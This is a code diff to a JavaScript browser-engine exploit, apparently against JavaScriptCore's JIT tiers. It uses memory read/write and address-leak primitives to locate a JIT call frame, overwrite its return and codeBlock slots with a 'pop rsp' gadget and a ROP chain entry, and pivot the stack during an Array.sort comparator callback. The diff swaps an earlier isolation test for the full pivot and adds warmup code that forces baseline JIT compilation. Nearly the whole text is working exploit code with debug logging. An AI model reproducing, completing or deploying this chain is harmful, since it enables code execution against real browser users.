@@ -366,12 +366,15 @@ async function prepare(p) {
         // 5) clean return: rsp := retSlot ; ret pops origRet (now restored)
         put(gaddr("pop rsp")); put(new int64(0, 0));      // 17,18 <- S_FINAL_RETSLOT
 
-        let done = false, calls = 0, origRet = null, origCB = null;
+        let done = false, calls = 0, armed = false, origRet = null, origCB = null;
         const comparator = function (a, b) {
             calls++;
-            // Warm up first: let sort baseline-JIT this function (native ret off
-            // CF+0x08, as the infloop test confirmed).
-            if (done || calls < 200) return (a >>> 0) - (b >>> 0);
+            // Only hijack once we are ARMED (i.e. during the real sort). The
+            // warmup below calls this directly many times with armed=false to
+            // force BASELINE JIT -- so its epilogue is a native `ret` that
+            // leaves rsp = CF+0x10 (LLInt's software op_ret does not, which is
+            // why the earlier pivot crashed).
+            if (done || !armed) return (a >>> 0) - (b >>> 0);
             const cf = findFrame();
             if (!cf) return (a >>> 0) - (b >>> 0);
             done = true;
@@ -395,25 +398,30 @@ async function prepare(p) {
                 + "-origCB=0x" + origCB.toString()
                 + "-cbLooksHeap=" + cbLooksHeap);
 
-            // ISOLATION TEST: same mechanism as the real chain (CF+0x08 = pop
-            // rsp, CF+0x10 = pivot target) but the target just loops. Outcomes:
-            //   HANG  -> pop rsp + CF+0x10 overwrite work; the earlier crash is
-            //            in my ROP chain body/return, not the pivot.
-            //   CRASH -> overwriting CF+0x10 (codeBlock) breaks the JIT return
-            //            epilogue; must pivot without touching CF+0x10.
-            p.write8(cbSlot, pivotBuf);
+            // Full pivot: CF+0x10 = chainEntry, CF+0x08 = pop rsp. On the JS
+            // return, the BASELINE native ret pops CF+0x08 -> pop rsp -> rsp =
+            // [CF+0x10] = chainEntry -> chain writes MAGIC, restores both slots,
+            // returns cleanly into sort.
+            p.write8(cbSlot, chainEntry);
             p.write8(retSlot, gaddr("pop rsp"));
-            selfLog("SELF-PIVOT-FIRED", "cf+0x08=pop rsp, cf+0x10=pivotBuf[infloop]"
-                + " -- HANG=mechanism-ok, CRASH=cf+0x10-overwrite-breaks-return");
+            selfLog("SELF-PIVOT-FIRED", "baseline pivot armed; returning now");
             return 0;
         };
         comparatorAddr = p.leakval(comparator);
         nogc.push(comparator);
         selfLog("SELF-COMPARATOR", "cell=0x" + comparatorAddr.toString());
 
-        // A big array of markers -> hundreds of comparator calls (warmup + JIT).
-        const arr = [];
-        for (let k = 0; k < 400; k++) arr.push((k & 1) ? M1 : M0);
+        // Warm up with direct JS->JS calls (these count toward tier-up, unlike
+        // host-boundary sort calls). ~600 hits baseline JIT without going DFG.
+        let warmSink = 0;
+        for (let k = 0; k < 600; k++) warmSink += comparator(k & 0xffff, (k + 1) & 0xffff);
+        selfLog("SELF-WARMUP", "calls=" + calls + "-sink=" + warmSink
+            + "-(should now be baseline-JIT)");
+
+        // Now arm and run a SMALL sort so only a few extra (baseline) calls
+        // happen -- the first hijacks the frame.
+        armed = true;
+        const arr = [M0, M1, M0, M1, M0, M1, M0, M1];
         arr.sort(comparator);
 
         const got = p.read8(scratch);
